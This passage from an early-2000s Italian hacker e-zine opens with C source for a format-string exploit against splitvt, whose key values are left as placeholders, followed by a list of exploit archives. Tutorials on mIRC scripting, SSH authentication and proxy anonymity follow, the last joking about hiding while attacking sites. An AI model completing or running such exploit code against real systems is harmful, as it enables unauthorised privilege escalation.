 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
 * USA
 */

#include <limits.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* array_of_strings_t */
typedef struct array_of_strings_s {
    size_t strings;
    char ** array;
} array_of_strings_t;

/* type_t */
typedef enum {
    short_int,
    signed_char,
    null
} type_t;

/* n_t */
typedef struct n_s {
    type_t type;
    void * pointer;
    int number;
} n_t;

/* <fixme> */
#define COMMAND ""
#define HOME_VALUE ""
#define SPLITVT ""
#define STACK ()
n_t n[] = {
    { null }
};
/* </fixme> */

unsigned long int eat;
array_of_strings_t aos_envp = { 0, NULL };
array_of_strings_t aos_argv = { 0, NULL };

/* array_of_strings() */
int array_of_strings( array_of_strings_t * p_aos, char * string )
{
    size_t strings;
    char ** array;

    if ( p_aos->strings == SIZE_MAX / sizeof(char *) ) {
        return( -1 );
    }
    strings = p_aos->strings + 1;

    array = realloc( p_aos->array, strings * sizeof(char *) );
    if ( array == NULL ) {
        return( -1 );
    }

    (p_aos->array = array)[ p_aos->strings++ ] = string;
    return( 0 );
}

#define HOME_KEY "HOME"
/* home() */
int home()
{
    char * home;
    unsigned int envp_home;
    unsigned int i;

    home = malloc( sizeof(HOME_KEY) + sizeof(HOME_VALUE) + (4-1) );
    if ( home == NULL ) {
        return( -1 );
    }

    strcpy( home, HOME_KEY"="HOME_VALUE );

    /* if HOME_VALUE holds a shellcode and is to be executed, 4 bytes
     * alignment is sometimes required (on sparc architectures for
     * example) */
    envp_home = STACK - sizeof(SPLITVT) - sizeof(HOME_VALUE);
    for ( i = 0; i < envp_home % 4; i++ ) {
        strcat( home, "X" );
    }

    return( array_of_strings(&aos_envp, home) );
}

/* shell() */
int shell()
{
    size_t size;
    unsigned int i;
    char * shell;
    char * string;

    size = 0;
    for ( i = 0; n[i].type != null; i++ ) {
        size += sizeof(void *);
    }

    shell = malloc( size + 3 + 1 );
    if ( shell == NULL ) {
        return( -1 );
    }

    for ( i = 0; n[i].type != null; i++ ) {
        *( (void **)shell + i ) = n[i].pointer;
    }

    /* since file is 16 bytes aligned on the stack, the following 3
     * characters padding ensures shell is 4 bytes aligned */
    for ( i = 0; i < 3; i++ ) {
        shell[ size + i ] = 'X';
    }

    shell[ size + i ] = '\0';

    for ( string = shell; string <= shell+size+i; string += strlen(string)+1 ) {
        if ( array_of_strings(&aos_argv, string) ) {
            return( -1 );
        }
    }

    return( 0 );
}

#define S "%s"
#define C "%c"
#define HN "%hn"
#define HHN "%hhn"
/* file() */
int file()
{
    size_t size;
    unsigned int i, j;
    char * file;
    int number;
    unsigned int argv_file;

    size = (sizeof(S)-1) + (eat * (sizeof(C)-1));
    for ( i = 0; n[i].type != null; i++ ) {
        switch ( n[i].type ) {
            case short_int:
                /* at most USHRT_MAX 'X's are needed */
                size += USHRT_MAX + (sizeof(HN)-1);
                break;

            case signed_char:
                /* at most UCHAR_MAX 'X's are needed */
                size += UCHAR_MAX + (sizeof(HHN)-1);
                break;

            case null:
            default:
                return( -1 );
        }
    }

    file = malloc( size + (16-1) + 1 );
    if ( file == NULL ) {
        return( -1 );
    }

    i = 0;

    memcpy( file + i, S, sizeof(S)-1 );
    i += sizeof(S)-1;

    for ( j = 0; j < eat; j++ ) {
        memcpy( file + i, C, sizeof(C)-1 );
        i += sizeof(C)-1;
    }

    /* initialize number to the number of characters written so far
     * (aos_envp.array[aos_envp.strings-2] corresponds to the HOME
     * environment variable) */
    number = strlen(aos_envp.array[aos_envp.strings-2])-sizeof(HOME_KEY) + eat;

    for ( j = 0; n[j].type != null; j++ ) {
        switch ( n[j].type ) {
            case short_int:
                while ( (short int)number != (short int)n[j].number ) {
                    file[ i++ ] = 'X';
                    number += 1;
                }
                memcpy( file + i, HN, sizeof(HN)-1 );
                i += sizeof(HN)-1;
                break;

            case signed_char:
                while ( (signed char)number != (signed char)n[j].number ) {
                    file[ i++ ] = 'X';
                    number += 1;
                }
                memcpy( file + i, HHN, sizeof(HHN)-1 );
                i += sizeof(HHN)-1;
                break;

            case null:
            default:
                return( -1 );
        }
    }

    /* in order to maintain a constant distance between the sprintf()
     * arguments and the splitvt shell argument, 16 bytes alignment is
     * sometimes required (for ELF binaries for example) */
    argv_file = STACK - sizeof(SPLITVT);
    for ( j = 0; aos_envp.array[j] != NULL; j++ ) {
        argv_file -= strlen( aos_envp.array[j] ) + 1;
    }
    argv_file -= i + 1;
    for ( j = 0; j < argv_file % 16; j++ ) {
        file[ i++ ] = 'X';
    }

    file[ i ] = '\0';

    return( array_of_strings(&aos_argv, file) );
}

/* main() */
int main( int argc, char * argv[] )
{
    /* eat */
    if ( argc != 2 ) {
        return( -1 );
    }
    eat = strtoul( argv[1], NULL, 0 );

    /* aos_envp */
    array_of_strings( &aos_envp, "TERM=vt100" );
    /* home() should always be called right before NULL is added to
     * aos_envp */
    if ( home() ) {
        return( -1 );
    }
    array_of_strings( &aos_envp, NULL );

    /* aos_argv */
    array_of_strings( &aos_argv, SPLITVT );
    array_of_strings( &aos_argv, "-upper" );
    array_of_strings( &aos_argv, COMMAND );
    array_of_strings( &aos_argv, "-lower" );
    array_of_strings( &aos_argv, COMMAND );
    /* shell() should always be called right before "-rcfile" is added
     * to aos_argv */
    if ( shell() ) {
        return( -1 );
    }
    array_of_strings( &aos_argv, "-rcfile" );
    /* file() should always be called right after "-rcfile" is added to
     * aos_argv and right before NULL is added to aos_argv */
    if ( file() ) {
        return( -1 );
    }
    array_of_strings( &aos_argv, NULL );

    /* execve() */
    execve( aos_argv.array[0], aos_argv.array, aos_envp.array );
    return( -1 );
}
   ------------------------Cut Here------------------------

Penso che così possa bastare per qualsiasi problema mailatemi a

umount@hotmail.com

prima di lasciarvi vi lascio qualche link utile dove trovare vasti archivi
di exploit:

www.bismark.it
www.packetstormsecurity.org
darknet.isforce.org         <- uno dei tanti mirror di hack.co.za
www.securityfocus.com
www.google.it               <- sempre utile per tutto e per tutti :)

Alla prossima e non scordate di visitare www.evil87.cjb.net (un pò di spam
ci vuole ogni tanto =)


------------------------------------*END*--------------------------------------


------------------------------------[13]---------------------------------------
-----------------------------------[Evil]--------------------------------------
------------------------------[mIRC Scripting]---------------------------------

        _____________ _____  ____  ______  _____
         ____  ______/ __| | __/ /__/_  _/  _/ /
          __  / __   ____  |  / /  __/ / ___/ /
         __/ _____/     _| |_/ /____/ /____/ /
        __  / ___     ___| |/ / ___/ /_ __/ /_____
       __________/ _________ /  _/____/ _/________/
                                                   .::mIRC Scripting::.
OoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoO
io non mi ritengo responsabile di come utilizzerete le informazioni
contenute in questa guida in quanto da me offerte a puro scopo
informativo!!
insomma in poche parole NON FATE CAZZATE!
OoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoO

questa guida è copyright © di [Evil]
www.evil87.cjb.net


Consumo: Nulla visto che sono le 6 di mattina!

Saluti: NoFlyZone-Crew , #hack , #swat3 , #smanettoni ecc..

Musica: Jovanotti - salvami.mp3 (poi ho preferito scrivere in silenzio :)

--------------------------
mIRC Scripting Parte 1
--------------------------

Il mIRC scripting , in poche parole è "l'arte" di creare uno script , in questo
caso basandosi sul client mIRC 5.91, per i newbies:
uno script irc è un client che si connette ad irc , e compie azioni che di solito
un client normale non possiede...allora perchè non farsene uno?
bene prima di tutto scaricatevi il mirc 5.91 da www.mondoirc.net

1.Script

Prima di tutto dobbiamo decidere che tipo di script fare (war , dark , classic ecc..)
quindi sceglierne i colori, costruirsi la grafica e infine assegnarne un nome :
Io sconsiglio di fare un war script, anche se darò qualche dritta per farne uno
(o ci arriverete da soli), i colori bisogna impostarli dal menù Tools/Colors... e
da qui impostarli , è logico che se lo sfondo è nero le scritte vanno chiare!
per la grafica ci sarà da lavorare sui remote, ma in questa prima parte non ne
parlerò, quindi aspettate la seconda parte del tutorial.
per il nome non cè problema, io consiglierei di dare il vostro nick seguito dalla
parola script

[]Nick[S]crip[]

2.Alias:

Gli alias sono istruzioni che hanno la funzione di abbreviare o dare ulteriori
comandi no presenti nel mirc stesso..
questo file è presente nella directory del mirc sotto nome di Aliases.ini
questo file dovrebbe contenere queste righe:

[aliases]
n0=/op /mode # +ooo $$1 $2 $3
n1=/dop /mode # -ooo $$1 $2 $3
n2=/j /join #$$1 $2-
n3=/p /part #
n4=/n /names #$$1
n5=/w /whois $$1
n6=/k /kick # $$1 $2-
n7=/q /query $$1
n8=/send /dcc send $1 $2
n9=/chat /dcc chat $1
n10=/ping /ctcp $$1 ping

vediamone ora la struttura , per poi crearne altri:

il comando per oppare un utente è /mode #canale +o nickname , ma negli aliases
vediamo:

/mode # +ooo $$1 $2 $3

 #   	   : indica il canale attivo
 +ooo      : il valore massimo del comando
 $$1 $2 $3 : indicano i nickname

quindi se noi vogliamo sfruttare l'alias /op dovremmo digitare

/op NICK1 NICK2 NICK3 o /op NICK1 NICK2 o ancora /op NICK1

non più di tre! perchè nell'alias abbiamo visto +ooo ma noi mettendo +ooooo
potremo opparne fino a cinque! +ooooooo fino a sette e cosi via...
ma mettendo il caso che lo script che vogliamo fare è personale, potremo aggiungere
un comando che oppi determinate persone (magari i nostri) quindi se i nostri amici
sono tizio e caio dovremo aggiungere una riga con questo comando:

n11=/ops /mode # +oo tizio caio

in questo modo con il comando /ops , opperemo (se presenti nel chan) i nostri due
amici, tizio e caio..
e se noi vogliamo che con un singolo tasto oppiamo i nostri due amici basterà usare
una delle funzioni "nascoste" degli alias ovvero /f1 /cf2 /sf3

;questo è un commento
n12=/f1 /mode # +oo tizio caio
;in questo modo premendo f1 oppiamo tizio e caio
n13=/cf1 /mode # +oo tizio caio
;premendo Ctrl+f1 oppiamo tizio e caio
n14=/sf1 /mode # +oo tizio caio
;premendo Shift+f1 oppiamo i due amici

penso che questa parte la avete capita tutti , però l'alias è ancora povero quindi
potremo aggiungere qualcosa per renderlo più simile ad un vero script

n15=/script /say []Nome[S]cript[]

in questo modo con il comando /script, il nostro script scriverà sul canale attivo
il nome dello script, ma volendo possiamo aggiungere qualche tocco grafico

n15=/script /say 9[]4Nome9[12S9]4cript9[]

beh spetta a voi provarlo!
ora aggiungiamo qualche comado abbastanza utile

n16=/time /say 0,1Sono le ore 9$time
;l'istruzione $time indica l'ora segnata dal vostro pc
n17=/date /say 0,1Oggi è il 9$date
;l'istruzione $date indica la data segnata dal tuo pc

ma vediamo tutte le istruzioni presenti nel mIRC

$time     'indica l'ora
$date     'indica la data
$day      'indica il giorno
$ip       'restituisce l'ip corrente
$server   'indica il server in cui si è connessi
$away     'restituisce lo stato di away
$version  'restituisce la versione del mIRC
$fulldate 'indica la data in modo completo

beh ce ne sono molti altri ma qui ci sono i più essenziali.
Una bella cosa da mettere nel proprio script sarebbe quella di renderlo veloce
nelle azioni , quindi fare in modo che con un pulsante voi vi connettete al vostro
server preferito, vi identificate e joinate nei chan da voi frequentati, impossibile?
Difficile? no anzi possibile e facilissimo!

n17=/f2 /server irc.server.net | /msg chanserv identify passwd | /join #chan1 |
/join #chan2 | /join #chan3

ora premete F2 e il gioco è fatto! cè da spiegare solo una cosa ovvero, il
carattere :
|
vale come divisorio tra una azione ed un altra.
una cosa essenziale per costruire dei buoni alias è quella di sapere tutti i comandi
del mIRC , niente problema molti gli ho elencati qui sotto:

/! Riporta l'ultimo comando usato nella barra
/amsg {text} Senda il messaggio a tutti i chan in cui siete
/ame {azione} Senda l'azione a tutti i chan in cui siete
/away {messaggio} Setta away lasciando il messaggio specificato
/away Torna dall'away
/ban #canale {nick} Banna il nick nel canale
/beep {numero} {ritardo} Suona numero di volte con ritardo in millesimi di secondi
 i beep
/clear Pulisce la finestra attiva
/clearall Pulisce tutte le finestre aperte
/dccsend {nickname} {file} Spedisce il file specificato al nickname
/dccchat {nickname} apre una dcc chat con il nick specificato
/disconnect Si disconnette forzatamente dal server
/dns {nickname|ip} Usa dns per risolvere l'indirizzo
/echo {text} Scrive una frase che può essere vista solo da voi
/exit Si chiude e si disconnette forzatamente
/invite {nick} {#chan} Invita nick in canale
/join {#chan} Entra nel chan
/kick {#chan} {nick} Kicka nick da canale
/list Da la lista di tutti i canali presenti nel server
/me {azione} Senda l'azione nella sola finestra attiva
/mode {#chan|nick} [[+|-]mode] Setta i mode canale/utente
/msg {nickname} {messaggio} Senda il messaggio a nick
/names {#chan} Mostra tutti gli uteni presenti nel chan
/nick {nickname} Cambia nickname
/omsg {#chan} {messaggio} Invia messaggio ai soli op del chan
/part {#chan} Esce dal chan
/partall Esce da tutti i chan in cui siete
/query {nick} Apre una query con nick
/quit {ragione} Quitta lasciando un messaggio
/run {dir} Apre determinato programma o :
/run {sito} Apre l'url specificato
/say {testo} Scrive nella finestra attiva
/server {indirizzo} {porta} Si connette al server
/topic {#chan} {topic} Cambia il topic
/whois {nick} Whoisa nick

Non sono tutti ma non sono neanche pochi con questi potrete divertivi e smanettare
un pò fino all'arrivo della prossima parte del tutorial

		              {Fine parte I}


------------------------------------*END*--------------------------------------

------------------------------------[14]---------------------------------------
------------------------------[]Lord[V]icio[]----------------------------------
-----------------------[Connessioni criptate in SSH]---------------------------
           

Uno dei maggiori pericoli della rete è lo sniffing,una delle tecniche 
più usate dai cracker per ottenere username e password validi per 
accedere ai sistemi che vogliono violare.Con la tecnica dello sniffing 
gli eventuali malintensionati si pongono in ascolto sulla nostra rete 
ed intercettano tutti i pacchetti in transito,allla ricerca di username 
e password trasmessi in chiaro.Se la vostra rete nn è sicura o volete 
collegarvi ad un server Unix che è su una rete diversa dalla vostra,x 
evitare il pericolo dello sniffing,conviene effettuare connessioni 
criptate....Secure Shell (ovvero Ssh) è il modo migliore x criptare le 
vostre connessioni verso altri sistemi e poter navigare tranquilli..
con ssh è possibile effettuare il tunnelling di connessioni x11 o di a
ltre applicazioni che lavorano su particolari porte,in modo che esse 
lavorino in modo sicuro!


---------------------------------------------------------------------------

Questo protocollo risolve inoltre alcuni "grossi" problemi di sicurezza dei 
protocolli TCP/IP come lo spoofing :

IP spoofing --------> falsificazione dell'indirizzo IP del mittente
DNS spoofing ----> falsificazione delle informazioni nel DNS
Routing spoofing  ---> falsificazione delle strade intraprese dai pacchetti

---------------------------------------------------------------------------


Esistono 2 versioni del protocollo Ssh,denominate brevemente Ssh1 e Ssh2
La Ssh1 è la + vecchia la Ssh2 è una completa riscrittura della vecchia 
versione ed è più sicura.Noi cmq ci occuperemo della priva versione...

                                
               \---->       InIzIam0      <----/


Ogni host su cui è installato ssh possiede una coppia di chiavi RSA 
(un algoritmo di crittografia a chiave asimmetrica) lunghe 1024 bit, una pubblica 
ed una privata. In più, ogni utente che utilizza ssh può opzionalmente generare 
una propria coppia di chiavi RSA.

All'atto della connessione, il server comunica al client due chiavi pubbliche:

* una fissa di 1024 bit che è la vera e propria chiave dell'host  ////
* l'altra di 768 bit che viene rigenerata ogni ora               ////

Il client allora genera una sequenza casuale di 256 bit (challange) e la codifica con 
le chiavi pubbliche del server. Da questo momento in poi la connessione viene crittografata 
con uno degli algoritmi a chiave simmetrica supportati da ssh (IDEA, DES, 3DES,ecc..) 
e si passa alla fase di autenticazione.

           

           \---->       AuTeNtiFiCazIOnE      <----/


Quando un utente tenta di collegarsi ad un sistema remoto,l'autentificazione
può avvenire in diversi modi:




* RhostsAuthentication 

Prevede che se il sistema da cui l'utente tenta il collegamento è elencato in uno
dei file /etc/hosts.equiv , /etc/ssh/shosts.equiv , $HOME/.rhosts , $HOME/.shosts ,
l'accesso è consentito senza password.Poichè questo metodo comporta una scarsa protezione 
verso i tentativi di spoofing,esso è disabilitato x default.




* RhostsRSAAuthentication

Questo metodo è la combinazione tra la precedente ed una autentificazione basata
su sistema RSA.In pratica l'accesso è consentito dai file /etc/hosts.equiv ,
/etc/ssh/shosts.equiv , $HOME/.rhosts , $HOME/.shosts e inoltre è presente 
nel file  /etc/ssh_known_hosts oppure $HOME/.ssh/known_hosts la chiave ke identifica
il client ke sta tentando la connessione,allora l'accesso è consentito.




* RSAAuthentication

Questo metodo si basa sul sistema di chiavi pubbliche e private Rsa.Ad ogni utente sono 
associate due chiavi utilizzate x l'autentificazione,una pubblica 
( immagazzinata nel file $HOME/.ssh/identity.pub ) ed una privata ( immagazzinata nel file 
$HOME/.ssh/identity ).In fase di autentificazione il client fornisce la chiave pubblica con 
la quale tenta il collegamento.Il server controlla nel file $HOME/.ssh/authorized_keys ke sia 
presente la chiave inviata dal client,in tal caso,invia al client un challenge ( un numero 
casuale,criptato usando la chiave pubblica del client ).Il client decripta il challenge
con la chiave privata dell'utente,e ne da comuicazione al server,dimostrando così di avere 
la chiave privata,così l'utente può accederesenza passw .




* Password
Se nessuo di questi metodi esposti ha successo , l'autentificazione viene effettuata
con la rikiesta all'utente di una passw,che viene cmq criptata ..






--------------------------------        END          ---------------------------------



Direi che con la teoria abbiamo finito , il prossimo appuntamento riguarderà
INSTALLAZIONE E CONFIGURAZIONE Ssh .... 

Se avete qualke dubbio nn esitate a contattarmi .........


Un salutone alla splendida NoFlyZone Crew che sta svolgendo un ottimo lavoro
in particolare a : Crashes (6 troppo tajo ;) , CityHunter (il filosofo della 
crew ;) , [V]lad (il mio rompi***** preferito ;)
ed a tutti gli altri membri ........... 
www.noflyzone-crew.cjb.net

X qualsiasi chiarimento basta mandarmi un e-mail o venirmi a trovare in irc
irc.azzurra.org #NoFlyZone ---- > my nick : []LoRd[V]icio[]

              

               _________________________________________
              [                                         ]
              [            Copyright (C) 2001           ]
              [                                         ]
              [ []LoRd[V]icio[]  -lordvicio@hotmail.com ]    
              [________________________________________ ]                 


------------------------------------*END*--------------------------------------


------------------------------------[15]---------------------------------------
---------------------------------[Advanced]------------------------------------
--------------------------------[Proxy/Sock]-----------------------------------






[x]»»»»»»»»»»»»»»»»»»»»»»»»»»»* S0mm4r10 * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

--[x] Sommario       -------- Indice/struttura del txt
--[1] Info           -------- Note/info sull'autore
--[2] Intro          -------- Testo introduttivo/saluti
--[3] Disclimer      -------- Responsabilità
--[4] Sock-Proxy     -------- Tutorial su Proxy e Sock
---[4.1] Che cosa sono    -------> Introduzione al concetto
---[4.2] Come funzionano  -------> Funzionamento di queste protezioni
-----[4.2.1] Http Proxy   -------> Proxy per il web
-----[4.2.2] Irc sock     -------> Anonimità in irc
-----[4.2.3] Irc proxy    -------> Proxy per irc
-----[4.2.4] Sock WinCrt    -------> Sock per wincrt
---[4.3] Sock != Socket   -------> Socket != Sock
---[4.4] Proxy List  -------- Vi ho pastato una lista di proxy
--[5] End            -------- Conclusioni, note finali

[1]»»»»»»»»»»»»»»»»»»»»»»»»»»»* Inf0 * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Date:19/11/01 -16.51 p.m
Author:ADvAnCeD`
MailTo:advanced@mojodo.cjb.net
Web: http://advanced.too.it

Gr3tz to: LordVicio, Hi-Tech Hate,Mautro,Bartx,Aladdin,The Gr|m, BigAlex,Tanaton,Havana7,
          OndaQuadra ,aNt}R{oPe, Salvo`b, Hi-Tech-hate, Ade_ , `fRa`, Ice-man, Resinaro, Syn,
          No-fly zone crew, #phreak.it, lInux & c, Hornet, Severance, SPYRO, LordVicio,
          MARSIO, uiha,D3fu ,Xanthic`, MightyInquisitor, Net Destroyer, bartx, FIx, ZIo_tom,
          lupsyn, Valk, Kewl`, #dbzone , #tcc ( non vi scioglieteeeeee!!!! ) , #mojodo,
          #hack, Delliah, NetDIgger, Goku, noflyzone , XarBas ( si scrive cosi?? ),
          Linus Torvalds,OndaQuadra, Raptor_ , resinaro,bart99,BigaleX,Valnir, Cate,Skizzo;
          Procsi, Flash,XP Terminator, Astharot, finiz:)Dibb3llas,Mautro,djk, ^Squalo^,uiha

FuCk tO:  vetranks, holaz ( me la paghi brutto pezzo di ***** ), windowsXP, billgates,
          professoressa CUcciari, Moratti,GDF,GAT,carabinieri,vigilesse,poliziotti, cellerini;
Fuck to:Parioli,Vetranks,s.s.Lazio,House,camicette,Suore

[2]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* InTr0 * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

*Documento ottimizzato per risoluzione di 800 x 600

-------------- 18/11/2°°1 2:46 AM --------------

<Go0oku> cosa scrivi?
<ADvA`WrITiNG> sock
<ADvA`WrITiNG> e procsi
<ADvA`WrITiNG> :)
<Go0oku> huahsuhda :)
<Go0oku> vojo essere nei ringraziamenti :)
<ADvA`WrITiNG> no
<Go0oku> haushdzhudhza
<ADvA`WrITiNG> te sei dapertutto nel documento
<ADvA`WrITiNG> :)
<Go0oku> cattivo
<Go0oku> :)
<Go0oku> uahsduhuzhd

-------------------------------------------------

Beh inizio ringraziando davvero moltissimo ^Goku^, un mio amikone ke mi ha aiutato davvero tanto
a conoscere bene i proxy e aFFini. Questo passa le giornate a provare liste immmense di proxy
e poi me le passa:) E` un grande. Salutoni!!!
Ps:non ti offendi se pasto qualke proxy su questo doc vero??? :****
Ringrazio inoltre tutti quelli ke mi sostengono in kuello ke scrivono e tutti quelli ke hanno
la pazienza di leggere :) Io scrivo perkè mi piace! Ora è notte, sabato e io sono qui tutto solo
davanti a questo mukkio di scritte su un monitor:stupendo:P ! Allora inizio a dire ke questo doc
parlerà di come usare sock e proxy per connettersi a irc, per navigare anonimi, e per molti
altri utilizzi pratici :) Vi rikordo ke a me l'anonimità piace molto, e ho scritto anke un bel
tutorial immenso sui wingate. Come ke kos'è un wingate -__- . Dai leggetevi il mio tutorial
per avere un imformazione completa sulla privacy (advanced.too.it) .

[3]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* D1sCl4im3r * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Secondo me, queste 2 parole ke torvi su tutti i siti in cui vai, tutti i documenti ke leggi,
tutte le guide atte a espandere delle cose ke "poki" sanno, non servono assolutamente a niente!!!
beh cmq molti dicono ke è necessario, quindi ce lo metto.

-Tutte le informazioni che troverete in questo documento sono a puro scopo informativo,
-e l'autore non incita i lettori a provare e effettuare manovre che potrebbero causare danni
-a terzi.Io, l'autore, non mi assumo nessuna responsabilità.

Ma sono proprio necessarie queste stronzate?? bOhhhHHHAH, io non ci credo cmq...  fate voi,
tanto state tranquilli ke con questo txt, o anke con kualunkue altro, non imparerete a bukare
siti governativi :P



[4]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ * Sock/Proxy *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Diciamo ke per me l'anonimità in rete è molto importante, come tutti voi,spero, anke io voglio
avere la mia privacy, coprire i miei dati per nascondermi, o per evitare di spargere il mio ip
al primo ke passa con un /dns, o ai gestori dei siti.... O insonna fatevi i kazzo vostri:)
Gia` per quato riguarda l'anonimità ho scritto un documento sui wingate, ke potete trovare sul
sito di mojodo ( http://mojodo.cjb.net ) . Ok ora parlero` di sock e proxy.Aspettate fatemi
mettere un po' di musika.... A ok vitamina h in mp3 :) ( la trovate su advanced.mirrorz.com )
e Ora.... Si iniZIA :)

[4.1] Che cosa sono     ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

I proxy, come le sock, come i Wingate, servono a maskerare il proprio ip address, e in qualke
kaso, l'identità nella grande net. Per esempio io voglio andare a guardarmi un sitazzo porno,
o qualke altro sito riservato, e non voglio far sapere i miei dati al mondo intero.Oppure voglio
chattare in irc stando trankuillo ke i lamah non risalgano al mio ip per smurfarmi con un semplice
/dns . Oppure voglio attakkare un sito  ( non lo farei mai sahsahsauh ) dal browser sfruttando
i cgi o altri bug, e ovviamente devo naskondermi dietro a proxy. Beh credo ke sia kiara l'utilità
dei proxy e delle sock... Analizziamoli meglio. I proxy sono dei pc, ke fanno un servizio
(volontariamente o involontariamente) di bouncing, e permettono di passare tutti i dati prima
sulla loro makkina, e poi alla destinazione dove vogliamo arrivare. Esempio grafiko come al
solito ;|

                           :)(:):((:):((:):)
|------|                   (:             (:                       |--------|
|      |---151.24.52.12--> :)             :)                       |        |
| Noi  |                   (: Proxy/sock  (:                       |al4a.com|
|      |                   :)             :) -----10.5.54.154--->  |        |
|------|                   (:   Server    (:                       |        |
                           :) 10.5.54.154 :)                       |        |
                           (:             :(                       |--------|
                           (:):((:):((:):((:

Uhm mi sembra tutto kiaro no? Noi vogliamo collegarci al sito www.al4a.com ( kiedete al mio polso
ke sito è :))))) ) ma vogliamo restare con un minimo di anonimità. Perciò noi ( 151.24.52.12 )
passeremo prima per il server proxy, ke si collegherà al sito da noi rikiesto, e così se il sito
logga gli accessi, troverà nei log l'ip del proxy. Molti proxy NON loggano, un buona 20% però
,si. Quindi attenti a quello ke fate!! Per più sicurezza è meglio concatenare più proxy uno
dopo l'altro.... ma ne parlerò in seguito. La stessa cosa succede con le sock per irc:



                           :)(:):((:):((:):)
|------|                   (:             (:                       |----------|
|      |---151.24.52.12--> :)             :)                       |          |
| Noi  |                   (:    Sock     (:                       |          |
|      |                   :)             :) -----10.5.54.154--->  |irc.tin.it|
|------|                   (:             (:                       |          |
                           :) 10.5.54.154 :)                       |          |
                           (:             :(                       |----------|
                           (:):((:):((:):((:

Anke in questo caso, il nostro hostname in irc comparirà come 10.5.54.154, e quindi sarà quasi
impossibile risalire al nostro ip, oppure i lamah idioti smurferanno il server e si prenderanno
una bella denuncia suhausahsuiahsiauhsiau :) .
Innanzitutto vorrei precisare ke le sock sono utilizzabili SOLO ED ESCLUSIVAMENTE per irc, mentre
i proxy sia per irc ke per l'http. Le sock usano la porta 1080, mentre i proxy la 80, la 8080
e anke la 3128. Imparatevi bene queste 4 porte ke vi salveranno il culazzo molte volte!!
Ma dove potete trovare proxy e sock? Beh diciamo ke in giro per il web, in siti si hacking,
sicurezza e affini potete reperire molte liste.... Io di solito per i proxy uso
http://atomintersoft.com/products/alive-proxy/proxy-list/?ap=6  che è secondo
me il sito più completo ke si possa trovare ( free), con possibilita di fare whois e avere
molte informazioni su ogni singolo proxy, inoltre sono constatemente aggiornati( mi pagano per
pubblicizzarli) SUHUHSA.  Se non vi piace... andate nei motori di ricerka e buon lavoro...
oppure ve li fate passare dai vostri amici. Io vi pasterei volentieri qui una decina di proxy
e sock... solo ke se poi questo documento viene letto da molte persone, e il proxy o la sock
sovrautilizzati, ovviamente l'adnim sarà costretto a kiuderlo. Cmq non dovete preokkuparvi ke
 ce ne sono tantissimi proxy, i wingate sono pokissimi in confronto, quindi no vi preokkupate...
 o se proprio non trovate niente mandatemi una mail:) In questo sito noterete un altra cosa molto
importante riguardante i proxy... Ogni ip è classificanto in due categorie: Anonymus e transparent.
Diciamo ke i più abbondanti e sicuri sono quellu anonymus, perkè permettono una copertura totale
dell ip, mentre quelli transparent fanno solamente da bounce, ma utilizzano il tuo ip... Ora
so di non essere stato molto kiaro su questo concetto, ma non sono riuscito a trovare molte
informazioni in più... vi posso solo dire le parole del mio maestro......

*-----------------------------------------------------------------------------*
<ValK> =)
<ADvAnCeD`>  posso kiederti la differenza tr proxy transparent e anonymus?
<ValK> vado che ho da fare
<ValK> =)
<ValK> allora
<ValK> il proxy trasparent usa il tuo ip per bounciarti
<ValK> quello anonymous
<ValK> usa il suo ip per bounciarti
<ValK> =)
<ValK> bounce=salto =)
<ValK> bnc=salto
<ValK> =)
<ADvAnCeD`> allora quello transparent non serve a niente?
<ValK> ora vado =)
<ValK> no serve
<ValK> serve fidati
<ValK> =)
<ADvAnCeD`> a kosa?
No such nick/channel
*-----------------------------------------------------------------------------*

:) Fidiamoci di lui!!! A beh posso darvi un link utile? Girazzando per security focus ho
trovato questo url http://www.securityfocus.com/vulns/stats.shtml contenente una statistike
delle vulnerabilità di tutti i S.O.  :) figooo. Skusate se non centrava niente :P Diciamo ke ora
avete imparato la teoria ( o NO ??? ) ora passiamo alla pratika. Intanto ringrazzio HopeHack
dei NewBie ( irc.azzurra.org #newbie )ke mi ha fatto un gran favore... non credo ke si può dire
qui... :) cmq cIAOOOOOOOOO!!!


[4.2] Come funzionano   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

In questa sezione del tutorial esamineremo bene la parte pratica ovvero,come fare ad utilizzare
proxy e sock.



[4.2.1] Http proxy       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Se usate internet explorer, dovrete andare nelle opzioni del browsers. Ci si può arrivare in due
modi: Tasto destro del mouse, proprietà, sull icona di intenet explorer, o una volta aperto il
browser, andare nel menù in alto "Strumenti" e selezionare "Opzioni internet". Nel dialog ke vi
si e` appena aperto, andate nell'area' CONNESSIONI, e clikkate sul bottone "Lan Settings", e vi
si aprirà un altro dialog con varie informazioni. Noterete ke li ci sono le impostazioni del
proxy.Barrate la casella "Usa un server proxy" e inserite l'ip e la porta del vostro proxy
preferito nei from sottostanti. Ora fate "applica" et voilà, ora ogni sito web ke visiterete
sarete automatikamente coperti dal proxy. Se volete settarvi più opzioni, accanto al from dove
inserire la porta del proxy, clikkate su "advanced" ( sauhuhsauhsa non clikkate su di me , ma sul
bottone :P ) . Li potete settare varie opzioni ke non è opportuno diskutere ora perkè sono le 2
di notte:). Questo metodo è molto veloce e automatizzato, e vi offre una buona protezione!
